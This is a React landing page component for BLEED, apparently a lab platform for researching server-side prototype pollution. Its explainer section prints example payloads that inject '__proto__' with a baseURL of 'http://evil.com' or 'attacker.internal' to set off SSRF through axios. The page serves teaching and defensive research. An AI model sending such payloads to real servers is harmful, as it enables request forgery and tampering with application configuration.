import { useNavigate } from 'react-router-dom'
import { motion } from 'framer-motion'
import { ArrowRight, ChevronRight } from 'lucide-react'
import BleedPathAnimation from '../components/chain/BleedPathAnimation'
import { mockChains, mockScenarios } from '../api/mockData'
import { StatusBadge } from '../components/common/Badge'

const chain = mockChains[0]!

function HeroAnimation() {
  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ delay: 0.6, duration: 0.5 }}
      className="mt-10"
    >
      <BleedPathAnimation chain={chain} autoPlay />
    </motion.div>
  )
}

export default function Landing() {
  const nav = useNavigate()

  return (
    <div className="min-h-screen bg-graphite text-ivory font-sans">
      {/* Nav */}
      <header className="flex items-center justify-between px-8 py-5 border-b border-border">
        <div className="flex items-center gap-3">
          <div className="w-7 h-7 bg-coral rounded-sm flex items-center justify-center">
            <span className="font-mono font-bold text-graphite text-xs">B</span>
          </div>
          <span className="font-bold tracking-widest text-sm">BLEED</span>
        </div>
        <nav className="hidden md:flex items-center gap-6 text-sm text-ivory/50">
          <button onClick={() => nav('/methodology')} className="hover:text-ivory transition-colors">Methodology</button>
          <button onClick={() => nav('/sources')} className="hover:text-ivory transition-colors">Sources</button>
          <button onClick={() => nav('/gadgets')} className="hover:text-ivory transition-colors">Gadgets</button>
        </nav>
        <button
          onClick={() => nav('/dashboard')}
          className="flex items-center gap-2 bg-coral text-graphite text-sm font-semibold px-4 py-2 rounded-sm hover:bg-coral/90 transition-colors"
        >
          Launch Lab <ArrowRight size={14} />
        </button>
      </header>

      {/* Hero */}
      <section className="max-w-4xl mx-auto px-8 pt-20 pb-16 text-center">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
          <div className="inline-flex items-center gap-2 border border-border rounded-full px-4 py-1.5 text-xs font-mono text-ivory/50 mb-8">
            <span className="w-1.5 h-1.5 bg-coral rounded-full" />
            Server-Side Prototype Pollution Research Platform
          </div>
          <h1 className="text-6xl md:text-8xl font-extrabold leading-none tracking-tight mb-2">
            ONE PROPERTY.
          </h1>
          <h1 className="text-6xl md:text-8xl font-extrabold leading-none tracking-tight text-coral mb-8">
            EVERY OBJECT.
          </h1>
          <p className="text-ivory/60 text-lg max-w-2xl mx-auto leading-relaxed mb-10">
            BLEED traces server-side prototype pollution from an untrusted input source through the JavaScript object model into downstream gadgets — and shows the impact inside a controlled research lab.
          </p>
          <div className="flex items-center justify-center gap-4 flex-wrap">
            <button
              onClick={() => nav('/dashboard')}
              className="flex items-center gap-2 bg-coral text-graphite font-bold px-6 py-3 rounded-sm hover:bg-coral/90 transition-colors text-sm"
            >
              Launch Research Lab <ArrowRight size={16} />
            </button>
            <button
              onClick={() => nav('/chains')}
              className="flex items-center gap-2 border border-border text-ivory/70 font-medium px-6 py-3 rounded-sm hover:border-ivory/40 hover:text-ivory transition-colors text-sm"
            >
              Explore a Chain <ChevronRight size={14} />
            </button>
            <button
              onClick={() => nav('/methodology')}
              className="flex items-center gap-2 text-ivory/50 font-medium px-6 py-3 rounded-sm hover:text-ivory transition-colors text-sm"
            >
              Read Methodology
            </button>
          </div>
        </motion.div>
        <HeroAnimation />
      </section>

      {/* Problem Section */}
      <section className="border-t border-border py-20 px-8">
        <div className="max-w-4xl mx-auto">
          <div className="text-xs font-mono text-ivory/30 uppercase tracking-widest mb-4">The Problem</div>
          <h2 className="text-3xl font-bold mb-6">What is Prototype Pollution?</h2>
          <div className="grid md:grid-cols-2 gap-8">
            <div className="text-ivory/60 text-sm leading-relaxed space-y-3">
              <p>
                In JavaScript, every object inherits from <code className="font-mono text-coral/80 bg-coral/5 px-1 rounded">Object.prototype</code> unless explicitly created with a null prototype. This inheritance chain is a core language feature — but it becomes an attack vector when an application merges untrusted input into an object without filtering the <code className="font-mono text-coral/80 bg-coral/5 px-1 rounded">__proto__</code> key.
              </p>
              <p>
                An attacker who can inject <code className="font-mono text-coral/80 bg-coral/5 px-1 rounded">{"{'__proto__': {'baseURL': 'http://evil.com'}}"}</code> into a merge operation poisons <code className="font-mono text-coral/80 bg-coral/5 px-1 rounded">Object.prototype</code> globally. Every object created after that point inherits the malicious property — including library configuration objects that read it unsafely.
              </p>
            </div>
            <div className="bg-surface border border-border rounded-md p-4 font-mono text-xs text-ivory/70 leading-relaxed">
              <div className="text-ivory/30 mb-2">// Attacker sends:</div>
              <div className="text-marigold">POST /api/config</div>
              <div>{'{"__proto__": {"baseURL": "http://attacker.internal/ssrf"}}'}</div>
              <div className="border-t border-border my-3" />
              <div className="text-ivory/30 mb-1">// deepMerge() runs without key checks</div>
              <div className="text-ivory/30 mb-1">// → Object.prototype.baseURL is now set</div>
              <div className="border-t border-border my-3" />
              <div className="text-ivory/30 mb-1">// Later, axios reads config:</div>
              <div>const url = config.baseURL <span className="text-ivory/30">// inherits from proto!</span></div>
              <div>axios.get(url) <span className="text-coral">// SSRF → attacker.internal</span></div>
            </div>
          </div>
        </div>
      </section>

      {/* Model Section */}
      <section className="border-t border-border py-20 px-8 bg-surface/30">
        <div className="max-w-4xl mx-auto">
          <div className="text-xs font-mono text-ivory/30 uppercase tracking-widest mb-4">Research Model</div>
          <h2 className="text-3xl font-bold mb-10">Source → Gadget → Impact</h2>
          <div className="grid md:grid-cols-3 gap-6">
            {[
              {
                label: 'Source',
                color: 'border-marigold/40',
                accent: 'text-marigold',
                bg: 'bg-marigold/5',
                desc: 'An application code path that merges untrusted input into an object without filtering __proto__, constructor, or prototype keys.',
                example: 'deepMerge(), Object.assign(), query parsers',
              },
              {
                label: 'Gadget',
                color: 'border-coral/40',
                accent: 'text-coral',
                bg: 'bg-coral/5',
                desc: 'A library or framework code path that reads a property from an object without hasOwnProperty checks, allowing inheritance from Object.prototype.',
                example: 'axios mergeConfig, EJS outputFunctionName, session.admin',
              },
              {
                label: 'Impact',
                color: 'border-coral/60',
                accent: 'text-coral',
                bg: 'bg-coral/10',
                desc: 'The controlled consequence when the gadget uses the polluted property. All impacts in BLEED are synthetic and isolated to the lab network.',
                example: 'SYNTHETIC_SSRF, SYNTHETIC_AUTH_BYPASS, SYNTHETIC_EXECUTION_MARKER',
              },
            ].map(({ label, color, accent, bg, desc, example }) => (
              <div key={label} className={`border rounded-lg p-5 ${color} ${bg}`}>
                <div className={`text-2xl font-bold font-mono mb-3 ${accent}`}>{label}</div>
                <p className="text-ivory/60 text-sm leading-relaxed mb-3">{desc}</p>
                <div className="text-xs font-mono text-ivory/30">{example}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Scenarios */}
      <section className="border-t border-border py-20 px-8">
        <div className="max-w-4xl mx-auto">
          <div className="text-xs font-mono text-ivory/30 uppercase tracking-widest mb-4">Research Scenarios</div>
          <h2 className="text-3xl font-bold mb-8">Controlled Research Scenarios</h2>
          <div className="grid md:grid-cols-2 gap-4">
            {mockScenarios.map(scn => (
              <button
                key={scn.id}
                onClick={() => nav('/chains')}
                className="text-left bg-surface border border-border hover:border-ivory/20 rounded-md p-4 transition-colors group"
              >
                <div className="flex items-center gap-2 mb-2">
                  <StatusBadge status={scn.difficulty} />
                  <span className="text-xs font-mono text-ivory/30">{scn.id}</span>
                </div>
                <div className="font-medium text-sm text-ivory mb-1">{scn.name}</div>
                <p className="text-xs text-ivory/50 leading-snug">{scn.description.slice(0, 100)}...</p>
                <div className="flex gap-1 mt-3 flex-wrap">
                  {scn.tags.slice(0, 3).map((t: string) => (
                    <span key={t} className="text-xs font-mono text-ivory/30 border border-border px-1.5 py-0.5 rounded">{t}</span>
                  ))}
                </div>
              </button>
            ))}
          </div>
        </div>
      </section>

      {/* CTA */}
      <section className="border-t border-border py-20 px-8 text-center">
        <div className="max-w-xl mx-auto">
          <h2 className="text-3xl font-bold mb-4">Start researching prototype pollution</h2>
          <p className="text-ivory/50 text-sm mb-8">All research runs in an isolated Docker lab. No real systems are targeted. All impacts are synthetic markers.</p>
          <button
            onClick={() => nav('/dashboard')}
            className="inline-flex items-center gap-2 bg-coral text-graphite font-bold px-8 py-4 rounded-sm hover:bg-coral/90 transition-colors"
          >
            Launch Research Lab <ArrowRight size={16} />
          </button>
        </div>
      </section>

      <footer className="border-t border-border px-8 py-6 text-center text-xs font-mono text-ivory/20">
        BLEED — Server-Side Prototype Pollution Research Platform · All lab impacts are synthetic and controlled
      </footer>
    </div>
  )
}
